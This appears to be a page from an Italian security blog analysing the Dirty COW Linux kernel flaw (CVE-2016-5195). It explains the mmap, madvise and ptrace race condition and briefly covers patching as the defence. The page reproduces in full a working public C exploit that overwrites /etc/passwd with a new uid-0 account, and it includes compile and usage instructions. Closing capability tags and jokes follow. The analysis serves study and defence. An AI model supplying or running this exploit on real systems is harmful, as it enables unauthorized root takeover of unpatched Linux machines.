+memoria utilizzando la funzione mmap, che crea un'associazione tra il file e
+una porzione della memoria virtuale del processo.
+
+;ptrace (o altre tecniche di modifica della memoria): Usando la syscall ptrace,
+che permette di controllare un processo, l'attaccante può alterare la memoria
+del file mappato, forzando la scrittura direttamente sulla memoria condivisa.
+
+;madvise: Questo sistema viene combinato con la syscall madvise, che serve a
+invalidare (o "consigliare" al kernel di dimenticare) determinate pagine di
+memoria. L'attaccante chiama ripetutamente madvise con il flag MADV_DONTNEED,
+che segnala al kernel di invalidare una pagina, rendendola nuovamente
+disponibile per la scrittura. Nel contesto dell'exploit Dirty COW, questa
+operazione di invalidazione viene eseguita ripetutamente per creare una race
+condition (condizione di competizione) tra il kernel, che gestisce la pagina
+mappata con il meccanismo di Copy-On-Write (proteggendo il file da modifiche
+dirette) e l'attaccante, che tenta di scrivere nella pagina attraverso chiamate
+come ptrace(). Grazie a questa race condition, l'attaccante riesce a scrivere
+nella pagina mappata in memoria, e la scrittura viene propagata fino al file
+fisico sul disco, nonostante le protezioni che dovrebbero impedirlo.
+
+;passaggi chiave dell'attacco:
+
+;mmap: L'attaccante mappa in memoria il file di sola lettura.
+;madvise: L'attaccante invoca ripetutamente madvise per invalidare la pagina
+mappata e forzare il sistema a "dimenticarla", richiedendo una nuova copia.
+;ptrace: Usando ptrace o altre tecniche di modifica della memoria, l'attaccante
+scrive nella memoria mappata del file, sfruttando il fatto che il kernel in
+alcuni momenti non copia la pagina correttamente (a causa della race
+condition).
+
+;grazie a questo attacco, l'attaccante riesce a modificare un file che dovrebbe
+essere di sola lettura, come ad esempio /etc/passwd. Il risultato specifico è
+l'aggiunta di un nuovo utente con privilegi di root senza che il sistema rilevi
+la modifica. Anche se il file viene aperto con i soli permessi di lettura, il
+COW permette di bypassare questo limite.
+
+;la scrittura nel file /etc/passwd avviene attraverso la chiamata
+ptrace(PTRACE_POKETEXT, ...), dove il padre scrive nella memoria del figlio.
+Grazie al comportamento di Copy-On-Write, le modifiche si riflettono nel file
+originale nonostante le protezioni di sola lettura del file mappato.
+
+;protezione contro Dirty COW
+;Il bug è stato corretto nel kernel di Linux subito dopo la sua scoperta nel
+2016, quindi la principale misura di protezione è mantenere il kernel
+aggiornato. Tuttavia, nel contesto di sistemi vulnerabili, sarebbe necessario
+un controllo rigido sui permessi dei file critici e sui privilegi di accesso
+degli utenti.
+
+;in sintesi
+;l'attacco Dirty COW sfrutta una race condition nel kernel Linux per poter
+scrivere su un file di sola lettura. ;combinando funzioni come mmap, madvise e
+ptrace, un attaccante può modificare file sensibili, come /etc/passwd, e
+ottenere accesso root al sistema.
+
+;c'è una mucca nella stanza, e non è nemmeno una mia idea! Vorrei però sapere
+chi ha portato dentro anche la stalla!
+
+------------------------------------------------------------------------------
+
+;indagando ulteriormente sul Dirty COW, sono risalito al sorgente
+dell'eseguibile, trovato su exploit-db relativo alla CVE-2016-5195, che
+conferma la giustezza dell'analisi effettuata.
+
+// This exploit uses the pokemon exploit of the dirtycow vulnerability
+// as a base and automatically generates a new passwd line.
+// The user will be prompted for the new password when the binary is run.
+// The original /etc/passwd file is then backed up to /tmp/passwd.bak
+// and overwrites the root account with the generated line.
+// After running the exploit you should be able to login with the newly
+// created user.
+//
+// To use this exploit modify the user values according to your needs.
+// The default is "firefart".
+//
+// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
+// https://github.com/dirtycow/dirtycow.githu...aster/pokemon.c
+//
+// Compile with:
+// gcc -pthread dirty.c -o dirty -lcrypt
+//
+// Then run the newly create binary by either doing:
+// "./dirty" or "./dirty my-new-password"
+//
+// Afterwards, you can either "su firefart" or "ssh firefart@..."
+//
+// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
+// mv /tmp/passwd.bak /etc/passwd
+//
+// Exploit adopted by Christian "FireFart" Mehlmauer
+// https://firefart.at
+//
+
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/ptrace.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <crypt.h>
+
+const char *filename = "/etc/passwd";
+const char *backup_filename = "/tmp/passwd.bak";
+const char *salt = "firefart";
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+struct Userinfo {
+char *username;
+char *hash;
+int user_id;
+int group_id;
+char *info;
+char *home_dir;
+char *shell;
+};
+
+char *generate_password_hash(char *plaintext_pw) {
+return crypt(plaintext_pw, salt);
+}
+
+char *generate_passwd_line(struct Userinfo u) {
+const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
+int size = snprintf(NULL, 0, format, u.username, u.hash,
+u.user_id, u.group_id, u.info, u.home_dir, u.shell);
+char *ret = malloc(size + 1);
+sprintf(ret, format, u.username, u.hash, u.user_id,
+u.group_id, u.info, u.home_dir, u.shell);
+return ret;
+}
+
+void *madviseThread(void *arg) {
+int i, c = 0;
+for(i = 0; i < 200000000; i++) {
+c += madvise(map, 100, MADV_DONTNEED);
+}
+printf("madvise %d\n\n", c);
+}
+
+int copy_file(const char *from, const char *to) {
+// check if target file already exists
+if(access(to, F_OK) != -1) {
+printf("File %s already exists! Please delete it and run again\n",to);
+return -1;
+}
+
+char ch;
+FILE *source, *target;
+
+source = fopen(from, "r");
+if(source == NULL) {
+return -1;
+}
+target = fopen(to, "w");
+if(target == NULL) {
+fclose(source);
+return -1;
+}
+
+while((ch = fgetc(source)) != EOF) {
+fputc(ch, target);
+}
+
+printf("%s successfully backed up to %s\n",from, to);
+
+fclose(source);
+fclose(target);
+
+return 0;
+}
+
+int main(int argc, char *argv[])
+{
+// backup file
+int ret = copy_file(filename, backup_filename);
+if (ret != 0) {
+exit(ret);
+}
+
+struct Userinfo user;
+// set values, change as needed
+user.username = "firefart";
+user.user_id = 0;
+user.group_id = 0;
+user.info = "pwned";
+user.home_dir = "/root";
+user.shell = "/bin/bash";
+
+char *plaintext_pw;
+
+if (argc >= 2) {
+plaintext_pw = argv[1];
+printf("Please enter the new password: %s\n", plaintext_pw);
+} else {
+plaintext_pw = getpass("Please enter the new password: ");
+}
+
+user.hash = generate_password_hash(plaintext_pw);
+char *complete_passwd_line = generate_passwd_line(user);
+printf("Complete line:\n%s\n", complete_passwd_line);
+
+f = open(filename, O_RDONLY);
+fstat(f, &st);
+map = mmap(NULL,
+st.st_size + sizeof(long),
+PROT_READ,
+MAP_PRIVATE,
+f,
+0);
+printf("mmap: %lx\n",(unsigned long)map);
+pid = fork();
+if(pid) {
+waitpid(pid, NULL, 0);
+int u, i, o, c = 0;
+int l=strlen(complete_passwd_line);
+for(i = 0; i < 10000/l; i++) {
+for(o = 0; o < l; o++) {
+for(u = 0; u < 10000; u++) {
+c += ptrace(PTRACE_POKETEXT,
+pid,
+map + o,
+*((long*)(complete_passwd_line + o)));
+}
+}
+}
+printf("ptrace %d\n",c);
+}
+else {
+pthread_create(&pth,
+NULL,
+madviseThread,
+NULL);
+ptrace(PTRACE_TRACEME);
+kill(getpid(), SIGSTOP);
+pthread_join(pth,NULL);
+}
+
+printf("Done! Check %s to see if the new user was created.\n", filename);
+printf("You can log in with the username '%s' and the password
+'%s'.\n\n",user.username, plaintext_pw);
+printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
+backup_filename, filename);
+return 0;
+}
+
+------------------------------------------------------------------------------
+
+;processo dettagliato
+
+;mappatura della memoria: Quando il file /etc/passwd viene aperto e mappato in
+memoria dal processo padre, il figlio eredita questa mappatura della memoria.
+All'inizio, il file è in sola lettura.
+
+;creazione del processo figlio: Viene creato un processo figlio con fork(), il
+quale ha una copia della mappatura del file in memoria.
+
+;inondazione di madvise(): Il thread creato nel processo figlio inizia a
+chiamare madvise() ripetutamente per indicare al kernel che le pagine di
+memoria non sono più necessarie. Questo comando cerca di far sì che il kernel
+"dimentichi" quelle pagine.
+
+;nota: Questo passaggio è una parte cruciale dell'attacco, poiché il madvise()
+non modifica realmente il file, ma cerca di liberare la memoria.
+
+;scrittura nel processo figlio: Mentre il processo figlio esegue madvise(), il
+processo padre usa ptrace(PTRACE_POKETEXT, ...) per scrivere nella memoria del
+processo figlio. Questo è dove viene scritta la nuova linea per il file
+/etc/passwd.
+
+;Copy-On-Write e Race Condition: Quando il padre tenta di scrivere nella
+memoria del figlio (anche se la mappatura è in sola lettura), il kernel rileva
+la scrittura e crea una copia della pagina di memoria che il figlio sta
+utilizzando. Questa copia viene poi modificata dal padre, mentre il processo
+figlio continua a invocare madvise(). Se ci sono dei tempi di esecuzione in cui
+il kernel crea una copia della pagina (grazie al ptrace del padre) e
+contemporaneamente il processo figlio continua a richiedere di liberare quella
+pagina, il risultato è che il file /etc/passwd può essere scritto con i dati
+dal padre, nonostante le restrizioni. Perchè il padre ha l'opportunità, grazie
+alla race condition, di sovrascrivere la pagina in memoria originale di sola
+lettura, mentre il figlio continua a lanciare madvise().
+
+;scrittura fisica nel file: A questo punto, se il padre decide di scrivere le
+modifiche nel file sul disco, può farlo tramite un'operazione come msync(), o
+una chiusura del file che implica il salvataggio delle modifiche. In questo
+caso, le modifiche apportate dal padre nella copia della memoria possono essere
+scritte fisicamente nel file /etc/passwd, sovrascrivendo il contenuto
+originale. Normalmente, in un attacco basato su Dirty COW, si presume che il
+comportamento di Copy-On-Write e il successivo comportamento del kernel
+scrivano automaticamente le modifiche, ma non viene gestito direttamente nel
+codice.
+
+------------------------------------------------------------------------------
+
+;File System
+
+;Get File Attributes [C0049]
+;Read File [C0051]
+;Writes File [C0052]
+
+;Process
+
+;Create Process [C0017]
+;Create Thread [C0038]
+;Terminate Process [C0018]
+
+;Capability
+
+;check file permission on Linux: host-interaction/file-system
+;get file attributes: host-interaction/file-system/meta
+;read file on Linux: host-interaction/file-system/read
+;write file on Linux: host-interaction/file-system/write
+;map or unmap memory on Linux: host-interaction/memory
+;get current PID on Linux: host-interaction/process
+;create process on Linux: host-interaction/process/create
+;terminate process via kill: host-interaction/process/terminate
+;create thread: host-interaction/thread/create
+
+;di tutte le stalle in cui potevo entrare, sono finito proprio in quella di una
+mucca cibernetica che mastica file di sistema.
+
+<a href="https://spaghetti-hacker.github.io/"><<</a> 
+</pre></div></center></body></html>
